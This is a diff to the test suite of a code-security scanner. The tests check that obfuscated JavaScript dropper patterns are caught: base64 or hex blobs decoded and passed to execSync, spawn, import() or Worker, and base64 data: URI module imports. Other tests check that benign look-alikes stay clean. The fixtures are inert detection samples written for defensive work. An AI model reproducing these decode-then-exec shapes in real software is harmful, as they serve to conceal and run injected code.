@@ -18,7 +18,7 @@ from stayawake.bots.security.signatures import load_signatures
 from stayawake.bots.security.scanner import scan_target
 from stayawake.bots.security.targets import LocalRepoTarget, ScanOptions
 from stayawake.bots.security.obfuscation import (
-    analyze_file, is_generated_context, _GENERATED_PATH,
+    analyze_file, analyze_delta, is_generated_context, _GENERATED_PATH, _has_exec_sink,
 )
 
 SIGS = load_signatures()
@@ -183,6 +183,138 @@ class TestWholeFileObfuscation(unittest.TestCase):
         self.assertLess(max(len(l) for l in joined.splitlines()), 400)
         self.assertNotIn(OBF, _scan({"reassembled.mjs": joined}))
         self.assertNotIn(OBF, _scan({"keys.mjs": used}))
+
+    # ── Variable-indirected decode→exec dropper: restores the #1212 base64 capability,
+    #    TIGHTENED — a blob is a signal ONLY when its decode result flows into a sink (#1289). ──
+    @staticmethod
+    def _blob(seed: int, n: int = 200) -> str:
+        random.seed(seed)
+        alph = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+        return "".join(random.choice(alph) for _ in range(n))
+
+    def test_var_indirected_decode_exec_dropper_caught(self):
+        # The #1212 blind spot + #1266 residual: a hardcoded blob decoded through a VARIABLE and
+        # then run. The nested `execSync(Buffer.from(...))` was already caught (#1266); the one-hop
+        # variable form was NOT. All three sink families (child_process / import() / Worker).
+        b = self._blob(1)
+        self.assertIn(OBF, _scan({
+            "cp.js": f"const p = '{b}';\nconst d = Buffer.from(p, 'base64');\nexecSync(d);\n"}))
+        self.assertIn(OBF, _scan({
+            "inline.mjs": f"const d = Buffer.from('{b}', 'base64');\nimport(d).then(m => m.run());\n"}))
+        self.assertIn(OBF, _scan({
+            "worker.js": f"const s = '{b}';\nconst w = Buffer.from(s, 'base64');\nnew Worker(w);\n"}))
+        self.assertIn(OBF, _scan({
+            "tostr.js": f"const c = Buffer.from('{b}', 'base64').toString();\nexecFileSync(c);\n"}))
+
+    def test_var_indirected_dropper_caught_as_evil_merge_delta(self):
+        # The G4 evil-merge hunk case the #1212 removal opened: the dropper introduced in a merge.
+        b = self._blob(2)
+        hunk = f"const p = '{b}';\nconst d = Buffer.from(p, 'base64');\nexecSync(d);\n"
+        self.assertTrue(analyze_delta(hunk))
+        self.assertTrue(analyze_delta(hunk, baseline="export const version = '1.2.3';\n"))
+
+    def test_hex_var_indirected_dropper_caught(self):
+        # FN-hunt: a HEX-encoded payload decoded through a variable and run. `_has_encoded_payload`
+        # corroborates hex (a >=200-char hex run) even though its ~4.0 entropy is below the base64
+        # 4.5 gate — otherwise `Buffer.from(p,'hex'); execSync(d)` slips (the code claims hex support).
+        hexblob = ("".join("%02x" % ((i * 37 + 11) % 256) for i in range(140)))  # 280 hex chars
+        self.assertIn(OBF, _scan({
+            "hex.js": f"const p = '{hexblob}';\nconst d = Buffer.from(p, 'hex');\nexecSync(d);\n"}))
+
+    def test_cross_scope_var_name_collision_stays_clean(self):
+        # FP-hunt (the strongest FP): a decode into `p` in ONE function and an unrelated `import(p)`
+        # param in ANOTHER — a pure name collision, not a data flow. The brace-depth scope check
+        # (the decode's `const p` is dead once its `}` passes) keeps this clean despite an embedded
+        # base64 key elsewhere in the file.
+        key = self._blob(4)
+        code = (
+            f"export const RELEASE_PUBKEY = '{key}';\n"
+            "export function decodeThumb(b64) {\n"
+            "  const p = Buffer.from(b64, 'base64');\n"
+            "  return sharp(p).resize(64).toBuffer();\n"
+            "}\n"
+            "export async function loadPage(p) {\n"
+            "  return import(p);\n"
+            "}\n"
+        )
+        self.assertNotIn(OBF, _scan({"mod.js": code}))
+
+    def test_module_level_decode_var_collision_stays_clean(self):
+        # FP-hunt round 2: a MODULE-LEVEL `const data = Buffer.from(...)` (benign binary handling)
+        # collides by NAME with a same-named param in a LATER function whose sink reads a PROPERTY of
+        # it (`spawn(data.cmd, data.args)`), while an embedded base64 root CA satisfies the blob
+        # corroborator. A module binding has no `}` to close, so the brace-depth check alone missed
+        # it — the property-access-sink guard and the re-bind guard keep it clean.
+        ca = self._blob(5)
+        cases = {
+            "spawn_prop.js": (
+                "const { spawn } = require('child_process');\n"
+                f"const ROOT_CA = '{ca}';\npinRootCert(ROOT_CA);\n"
+                "const data = Buffer.from(headerBytes);\nfs.writeFileSync(cachePath, data);\n"
+                "function run(data) { return spawn(data.cmd, data.args, { stdio: 'inherit' }); }\n"),
+            "import_prop.js": (
+                f"const KEY = '{ca}';\nconst mod = Buffer.from(raw);\nsave(mod);\n"
+                "function load(mod) { return import(mod.entry); }\n"),
+            "import_param.mjs": (
+                f"const K = '{ca}';\nconst config = Buffer.from(bytes);\ncache(config);\n"
+                "export const loadPage = (config) => import(config);\n"),
+        }
+        for name, code in cases.items():
+            self.assertNotIn(OBF, _scan({name: code}), name)
+
+    def test_real_dropper_variants_still_caught_after_scope_guards(self):
+        # The accuracy guards must NOT drop the real dropper: bare var, `.toString()` at the sink,
+        # a decoded command with args, an intervening unrelated arrow callback (whose param is a
+        # DIFFERENT name), and a CHAINED string-method decode idiom (`.toString('utf8').trim()`).
+        b = self._blob(6)
+        self.assertIn(OBF, _scan({
+            "bare.js": f"const d = Buffer.from('{b}', 'base64');\nexecSync(d);\n"}))
+        self.assertIn(OBF, _scan({
+            "tostr.js": f"const d = Buffer.from('{b}', 'base64');\nexecSync(d.toString('utf8'));\n"}))
+        self.assertIn(OBF, _scan({
+            "chain.js": f"const d = Buffer.from('{b}', 'base64');\nexecSync(d.toString('utf8').trim());\n"}))
+        self.assertIn(OBF, _scan({
+            "args.js": f"const c = Buffer.from('{b}', 'base64').toString();\nspawn(c, ['-e']);\n"}))
+        self.assertIn(OBF, _scan({
+            "arrow.js": f"const d = Buffer.from('{b}', 'base64');\nitems.forEach(x => log(x));\nexecSync(d);\n"}))
+
+    def test_es6_param_name_collisions_stay_clean(self):
+        # FP-hunt round 3: a module-level decode var colliding with a same-named param in an ES6
+        # METHOD-SHORTHAND, a CLASS METHOD, or a `catch` binding — none of which use the `function`
+        # keyword or an arrow, so an earlier param-detector missed them and the FP still fired.
+        key = self._blob(7)
+        cases = {
+            "method_shorthand.js": (
+                f"const K = '{key}';\nconst src = Buffer.from(raw, 'base64');\ncache(src);\n"
+                "export const registry = {\n"
+                "  spawnWorker(src) { return new Worker(src, { type: 'module' }); }\n};\n"),
+            "class_method.js": (
+                f"const K = '{key}';\nconst data = Buffer.from(raw);\nsave(data);\n"
+                "class Runner {\n  run(data) { return spawn(data); }\n}\n"),
+            "catch_param.js": (
+                f"const K = '{key}';\nconst data = Buffer.from(raw);\nsave(data);\n"
+                "try { risky(); } catch (data) { execSync(data); }\n"),
+        }
+        for name, code in cases.items():
+            self.assertNotIn(OBF, _scan({name: code}), name)
+
+    def test_lone_blob_and_benign_decode_stay_clean(self):
+        # The #1212 FP class stays fixed: a blob is NEVER a signal without the decode→sink flow.
+        b = self._blob(3)
+        cases = {
+            # a mock JWT / API token constant — used as-is, never decoded.
+            "jwt.ts": f"const token = '{b}';\nexport default token;\n",
+            # a JWT-parsing util: the KEY blob is not the thing decoded; the token is, with NO exec.
+            "verify.ts": f"const KEY = '{b}';\nconst h = JSON.parse(Buffer.from(tok, 'base64').toString());\n",
+            # decode a hardcoded asset blob but NO exec sink — an inlined resource.
+            "asset.ts": f"const png = Buffer.from('{b}', 'base64');\nreturn png;\n",
+            # THE case a naive 'blob decoded AND file can exec' rule (Option A) would FP on:
+            # a build script that runs a command AND separately embeds a base64 asset. The decode
+            # result never reaches the sink, so the flow-based check correctly stays clean.
+            "build.js": f"execSync('webpack --mode production');\nconst logo = Buffer.from('{b}', 'base64');\n",
+        }
+        for name, code in cases.items():
+            self.assertNotIn(OBF, _scan({name: code}), name)
 
     # ── False positives: legit dense source / vendored context stays clean ──────
     def test_normal_big_component_clean(self):
@@ -369,27 +501,48 @@ class TestWholeFileObfuscation(unittest.TestCase):
         ):
             self.assertFalse(analyze_file(code, ".ts"), code)
 
-    # ── #1208 residual (after #1206 + #1266): non-literal import, constructed
-    #    child_process command, require('vm').runInContext — heuristic SUSPICIOUS. ──
-    def test_dynamic_import_non_literal_flagged(self):
-        self.assertTrue(analyze_file("const m = await import(attackerUrl);\n", ".mjs"))
-        self.assertTrue(analyze_file("import(decodedModule).then(m => m.run());\n", ".js"))
-        self.assertTrue(analyze_file("import(`${attackerUrl}`);\n", ".js"))
-        self.assertTrue(analyze_file("import(`https://${host}/p.js`);\n", ".js"))
-        # decode form is also #1266; still must fire
+    # ── #1208 residual, TIGHTENED per #1289. The BROAD arms (any non-literal import / any
+    #    constructed child_process command) were FP-prone at scan time (every lazy-import / build
+    #    script fired), so they no longer raise a SCAN finding — only the precise, no-benign-analogue
+    #    shapes do: a data:-URI executable import and a require-receiver runner fed a decode.
+    #    (`require('vm').runInContext` and `import(atob(x))` fire via _EXEC_SINK / #1266.) The broad
+    #    arms are RETAINED as the conservative remediation gate — see
+    #    test_remediation_gate_stays_conservative below (tighten, not downgrade). ──
+    def test_data_uri_executable_import_flagged(self):
+        # An inline JS-MIME AND base64-ENCODED data: URI imported as a MODULE — the concealed
+        # stage-2 loader. Literal, concat-appended payload, and template forms.
+        self.assertTrue(analyze_file("import('data:text/javascript;base64,ZXZpbA==');\n", ".mjs"))
+        self.assertTrue(analyze_file("import('data:application/javascript;base64,' + p);\n", ".mjs"))
+        self.assertTrue(analyze_file("import(`data:text/ecmascript;base64,${p}`);\n", ".mjs"))
+        self.assertTrue(analyze_file(
+            "import('data:text/javascript;charset=utf-8;base64,ZQ==');\n", ".mjs"))
+        # decode form is #1266's _DECODE_INTO_EXEC — still fires.
         self.assertTrue(analyze_file("import(atob(payload));\n", ".js"))
 
-    def test_constructed_child_process_command_flagged(self):
-        self.assertTrue(analyze_file("execSync(cmd + ' --force');\n", ".js"))
-        self.assertTrue(analyze_file("spawnSync(`sh -c ${payload}`);\n", ".js"))
-        self.assertTrue(analyze_file("fork(bin + ext);\n", ".js"))
+    def test_plaintext_data_uri_import_clean(self):
+        # FP-hunt: a PLAINTEXT `data:text/javascript,<code>` import is a documented, standards-blessed
+        # inline-module idiom (module-loader tests, REPL/playground tools, Deno) — the code is
+        # READABLE, i.e. not obfuscation. Only the base64-ENCODED form is a concealed payload.
+        self.assertFalse(analyze_file(
+            "const m = await import('data:text/javascript,export const answer = 42');\n", ".mjs"))
+        self.assertFalse(analyze_file("import('data:text/javascript,globalThis.x=1');\n", ".js"))
+
+    def test_require_receiver_runner_decode_flagged(self):
+        # A require-RECEIVER command runner fed a DECODE — the form #1266's bare-name set misses.
+        self.assertTrue(analyze_file("require('child_process').exec(atob(cmd));\n", ".js"))
         self.assertTrue(analyze_file(
-            "require('child_process').exec(cmd + flags);\n", ".js"))
-        self.assertTrue(analyze_file(
-            "require('child_process').execSync(`run ${x}`);\n", ".js"))
-        # decode form via .exec — #1266 covers bare execSync(decode); this covers .exec
-        self.assertTrue(analyze_file(
-            "require('child_process').exec(atob(cmd));\n", ".js"))
+            "require('child_process').execSync(Buffer.from(c, 'base64').toString());\n", ".js"))
+        self.assertTrue(analyze_file("require('node:child_process').spawn(atob(cmd));\n", ".js"))
+        self.assertTrue(analyze_file("require('shelljs').exec(atob(cmd));\n", ".js"))
+
+    def test_require_receiver_non_command_exec_decode_clean(self):
+        # FP-hunt: `.exec` on a NON-command module fed a decode is benign — RegExp.exec on decoded
+        # text, or a sqlite `.exec` of a base64-packed migration. The module gate (child_process /
+        # shelljs) keeps these clean.
+        self.assertFalse(analyze_file(
+            "const m = require('./patterns/token').exec(Buffer.from(rec, 'base64').toString());\n", ".js"))
+        self.assertFalse(analyze_file(
+            "require('./db').exec(Buffer.from(sql, 'base64').toString('utf8'));\n", ".js"))
 
     def test_require_vm_runInContext_flagged(self):
         self.assertTrue(analyze_file("require('vm').runInContext(code, ctx);\n", ".js"))
@@ -418,8 +571,38 @@ class TestWholeFileObfuscation(unittest.TestCase):
             "// Example: load via import(pluginUrl) at runtime\nexport const ok = 1;\n",
             "'import(url)';\n",
             "\"execSync(cmd + x)\";\n",
+            # a data: URI import whose MIME is NOT javascript is an inert data module (JSON), not
+            # executable — must stay clean (the MIME gate, not a bare `;base64,` match).
+            "const cfg = await import('data:application/json;base64,eyJhIjoxfQ==');\n",
+            "import('data:text/css,body{color:red}');\n",
+            # #1289 — the BROAD arms are no longer a scan finding (indistinguishable from legit):
+            "const m = await import(componentPath);\n",           # React.lazy-style dynamic import
+            "import(decodedModule).then(m => m.run());\n",        # bare-ident import
+            "import(`${attackerUrl}`);\n",                        # bare-template import
+            "import(`https://${host}/p.js`);\n",                  # remote-template import
+            "execSync(cmd + ' --force');\n",                      # constructed command
+            "spawnSync(`sh -c ${payload}`);\n",                   # constructed template command
+            "fork(bin + ext);\n",
+            "require('child_process').execSync(`run ${x}`);\n",   # constructed require-cp command
+            "require('child_process').exec(cmd + flags);\n",
+            # a data: URI merely MENTIONED in a comment must stay clean (comment scrub).
+            "// import('data:text/javascript;base64,AAAA') is the attack\nexport const y = 2;\n",
         ):
             self.assertFalse(analyze_file(code, ".ts"), code)
+
+    def test_remediation_gate_stays_conservative(self):
+        # tighten-not-downgrade proof: the BROAD #1208 arms no longer raise a scan finding
+        # (asserted clean above), but the remediation "safe to auto-clean?" gate (strict=True)
+        # STILL treats them as a possible dynamic-exec sink → refuses (an over-refusal is the safe
+        # direction there). A miss here could auto-clean past an injected RCE, so it must not regress.
+        for code in (
+            "import(componentPath);\n",
+            "import(`${attackerUrl}`);\n",
+            "execSync(cmd + ' --force');\n",
+            "require('child_process').execSync(`run ${x}`);\n",
+        ):
+            self.assertTrue(_has_exec_sink(code, strict=True), f"gate must refuse: {code}")
+            self.assertFalse(_has_exec_sink(code, strict=False), f"scan must be clean: {code}")
 
     # ── #1207 residual (after #1206; orthogonal to #1208/#1266): split-token via
     #    concat-fold, indirect comma-call, light alias / runtime-key — heuristic. ──
